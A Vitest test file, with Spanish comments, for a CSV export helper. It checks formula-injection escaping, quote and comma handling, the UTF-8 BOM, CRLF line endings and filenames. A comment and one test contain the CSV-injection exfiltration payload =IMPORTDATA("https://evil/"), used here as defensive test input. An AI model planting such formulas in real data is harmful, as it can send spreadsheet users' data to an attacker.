import { describe, it, expect } from "vitest";
import { rowsToCsv, csvFilename } from "@/lib/export/csv";

// El export de clientes/pedidos/productos saca PII y contenido controlado
// por el usuario (nombres, notas). Si no escapamos las fórmulas, un cliente
// con nombre `=IMPORTDATA("https://evil/")` ejecuta esa fórmula cuando el
// owner abre el CSV en Excel/LibreOffice (CSV injection — OWASP). Estos
// tests fijan ese contrato de escape.

const BOM = "﻿";

describe("rowsToCsv — escape de fórmulas (CSV injection)", () => {
  it("prefija apóstrofe a valores que empiezan con =, +, -, @", () => {
    const csv = rowsToCsv(
      ["nombre"],
      [["=cmd()"], ["+1"], ["-2"], ["@SUM(A1)"]],
    );
    expect(csv).toContain("'=cmd()");
    expect(csv).toContain("'+1");
    expect(csv).toContain("'-2");
    expect(csv).toContain("'@SUM(A1)");
  });

  it("neutraliza el payload clásico de exfiltración", () => {
    const payload = '=IMPORTDATA("https://evil/")';
    const csv = rowsToCsv(["nombre"], [[payload]]);
    // Doble defensa: (1) apóstrofe protector justo tras la comilla de apertura
    // del wrapping, y (2) las comillas internas del payload se duplican
    // (`"` → `""`) por el escape CSV estándar. Resultado neutralizado:
    //   "'=IMPORTDATA(""https://evil/"")"
    expect(csv).toContain(`"'=IMPORTDATA(""https://evil/"")"`);
    // Lo esencial: la fórmula ya no arranca con `=` crudo.
    expect(csv).not.toContain(`\n=IMPORTDATA`);
  });

  it("no toca valores que empiezan con texto normal", () => {
    const csv = rowsToCsv(["nombre"], [["Juan Pérez"]]);
    expect(csv).toContain("Juan Pérez");
    expect(csv).not.toContain("'Juan");
  });
});

describe("rowsToCsv — escape de comillas y separadores", () => {
  it("envuelve en comillas los valores con coma", () => {
    const csv = rowsToCsv(["dir"], [["Calle 1, Zona Sur"]]);
    expect(csv).toContain('"Calle 1, Zona Sur"');
  });

  it("duplica comillas internas", () => {
    const csv = rowsToCsv(["nota"], [['dijo "hola"']]);
    expect(csv).toContain('"dijo ""hola"""');
  });

  it("envuelve valores con salto de línea", () => {
    const csv = rowsToCsv(["nota"], [["linea1\nlinea2"]]);
    expect(csv).toContain('"linea1\nlinea2"');
  });
});

describe("rowsToCsv — estructura y encoding", () => {
  it("arranca con BOM UTF-8 para que Excel detecte tildes/ñ", () => {
    const csv = rowsToCsv(["a"], [["ñoño"]]);
    expect(csv.startsWith(BOM)).toBe(true);
  });

  it("usa CRLF entre filas y termina con CRLF", () => {
    const csv = rowsToCsv(["a", "b"], [["1", "2"]]);
    expect(csv).toBe(`${BOM}a,b\r\n1,2\r\n`);
  });

  it("serializa null/undefined como celda vacía", () => {
    const csv = rowsToCsv(["a", "b"], [[null, undefined]]);
    expect(csv).toBe(`${BOM}a,b\r\n,\r\n`);
  });

  it("serializa Date como ISO", () => {
    const d = new Date("2026-05-13T14:32:00.000Z");
    const csv = rowsToCsv(["fecha"], [[d]]);
    expect(csv).toContain("2026-05-13T14:32:00.000Z");
  });
});

describe("csvFilename", () => {
  it("agrega la fecha YYYY-MM-DD y extensión .csv", () => {
    const name = csvFilename("clientes");
    expect(name).toMatch(/^clientes-\d{4}-\d{2}-\d{2}\.csv$/);
  });
});
